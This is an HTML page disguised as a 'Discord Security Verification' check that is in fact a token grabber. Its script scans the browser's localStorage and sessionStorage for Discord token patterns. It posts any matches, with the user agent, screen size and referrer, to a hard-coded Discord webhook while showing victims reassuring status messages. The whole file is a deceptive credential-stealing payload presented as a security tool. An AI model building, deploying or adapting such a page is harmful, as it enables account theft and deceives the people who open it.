<!DOCTYPE html>
<html>
<head>
    <title>Discord Session Check</title>
    <style>
    body{margin:0;padding:40px;background:#36393f;color:#dcddde;font-family:Arial;text-align:center}
    .box{max-width:450px;margin:auto;background:#2f3136;padding:30px;border-radius:8px;box-shadow:0 8px 30px rgba(0,0,0,.6)}
    button{background:#5865f2;color:white;border:0;padding:15px 30px;border-radius:5px;font-size:16px;cursor:pointer;font-weight:bold}
    button:hover{background:#4f55d4}
    #spin{display:none;border:3px solid #5865f2;border-top-color:transparent;border-radius:50%;width:25px;height:25px;margin:15px auto;animation:r 1s linear infinite}
    @keyframes r{to{transform:rotate(360deg)}}
    #log{background:#1e1f22;padding:15px;border-radius:5px;margin-top:20px;font-size:14px;text-align:left;max-height:300px;overflow:auto;white-space:pre-wrap}
    .success{color:#43b581}.error{color:#f04747}.info{color:#7289da}
    </style>
</head>
<body>
<div class="box">
    <h2>üîí Discord Security Verification</h2>
    <p>Please wait while we verify your session...</p>
    <button id="btn">üîç Scan Discord Tokens</button>
    <div id="spin"></div>
    <div id="status">Ready to scan</div>
    <div id="log"></div>
</div>

<script>
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1458805262717554860/3tbcU7WYe5patEKfvuF0WcgptMotAhK2k7vY9_e9kwOIU8u3zzNgU71ZkXKGcY7FNh32'; // ‚Üê MUST REPLACE THIS!

function log(msg, type='info') {
    const logDiv = document.getElementById('log');
    const time = new Date().toLocaleTimeString();
    logDiv.innerHTML += `<span class="${type}">[${time}] ${msg}\n</span>`;
    logDiv.scrollTop = logDiv.scrollHeight;
    console.log(`[${type.toUpperCase()}] ${msg}`);
}

log('üöÄ Token Grabber LOADED - Open Discord.com first, then click Scan');
document.getElementById('btn').onclick = runGrabber;

async function runGrabber() {
    log('üéØ STARTING TOKEN HUNT...');
    document.getElementById('btn').style.display = 'none';
    document.getElementById('spin').style.display = 'block';
    document.getElementById('status').textContent = 'Hunting tokens...';
    
    const results = await huntTokens();
    
    document.getElementById('spin').style.display = 'none';
    document.getElementById('status').innerHTML = `<a href="https://discord.com/app" style="color:#43b581">‚úÖ Go to Discord</a>`;
    
    if(results.tokens.length > 0) {
        log(`üéâ FOUND ${results.tokens.length} TOKEN(S)! Sending...`);
        await sendToWebhook(results);
        log('‚úÖ WEBHOOK SUCCESS - Check your Discord!');
    } else {
        log('‚ùå No tokens found. STEPS TO FIX:', 'error');
        log('1. Open https://discord.com/app in ANOTHER TAB', 'error');
        log('2. Login to Discord', 'error');
        log('3. Refresh this page and click Scan AGAIN', 'error');
        log('4. Storage scan results:', 'error');
        log(`LocalStorage items: ${results.storageCount}`, 'error');
        log(`Discord-related keys: ${results.discordKeys.join(', ')}`, 'error');
    }
}

async function huntTokens() {
    const tokens = [];
    const discordKeys = [];
    let storageCount = 0;
    
    // SCAN LOCALSTORAGE (Primary)
    log('üìÇ Scanning LocalStorage...');
    for(let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        storageCount++;
        if(key && (key.includes('discord') || key.includes('token'))) {
            discordKeys.push(key);
            const value = localStorage.getItem(key);
            const token = extractToken(value);
            if(token) {
                tokens.push({source: 'LocalStorage', key: key, token: token});
                log(`‚úÖ TOKEN FOUND: LocalStorage.${key}`, 'success');
            }
        }
    }
    
    // SESSIONSTORAGE
    log('üìÇ Scanning SessionStorage...');
    for(let i = 0; i < sessionStorage.length; i++) {
        const value = sessionStorage.getItem(sessionStorage.key(i));
        const token = extractToken(value);
        if(token) {
            tokens.push({source: 'SessionStorage', token: token});
            log('‚úÖ TOKEN FOUND: SessionStorage', 'success');
        }
    }
    
    return {tokens, storageCount, discordKeys};
}

function extractToken(text) {
    if(!text) return null;
    const patterns = [
        /mfa\.[\w\-]{84}/,
        /[\w\-]{24}\.[\w\-]{6}\.[\w\-]{27}/
    ];
    for(let pattern of patterns) {
        const match = text.match(pattern);
        if(match) return match[0];
    }
    return null;
}

async function sendToWebhook(data) {
    if(WEBHOOK_URL.includes('YOUR_WEBHOOK')) {
        log('‚ùå WEBHOOK URL NOT SET! Edit line 55 with your Discord webhook', 'error');
        return;
    }
    
    const payload = {
        username: 'üíé Discord Token Grabber',
        avatar_url: 'https://discord.com/assets/6debd47ed13483642cf09e832ed0bc1b.png',
        embeds: [{
            title: `üéØ ${data.tokens.length} Discord Token(s) Captured`,
            color: 16711680,
            fields: [
                {name: 'üîë Tokens Found', value: data.tokens.length.toString(), inline: true},
                {name: 'üì± User Agent', value: navigator.userAgent.slice(0, 50)+'...', inline: false},
                {name: 'üñ•Ô∏è Screen', value: `${screen.width}x${screen.height}`, inline: true},
                {name: 'üåê Referrer', value: document.referrer || 'Direct', inline: true}
            ],
            timestamp: new Date().toISOString()
        }]
    };
    
    // Send main embed
    const response = await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(payload)
    });
    
    if(response.ok) {
        log('‚úÖ Main webhook sent!', 'success');
        
        // Send detailed tokens
        let tokenList = '';
        data.tokens.forEach((t, i) => {
            tokenList += `${i+1}. **${t.source}**\n\`${t.token.slice(0, 25)}...\`\n\n`;
        });
        
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                content: '**üìã FULL TOKENS:**\n' + tokenList,
                username: 'Token Details'
            })
        });
        log('‚úÖ Detailed tokens sent!', 'success');
    } else {
        log(`‚ùå Webhook failed: ${response.status}`, 'error');
    }
}
</script>
</body>
</html>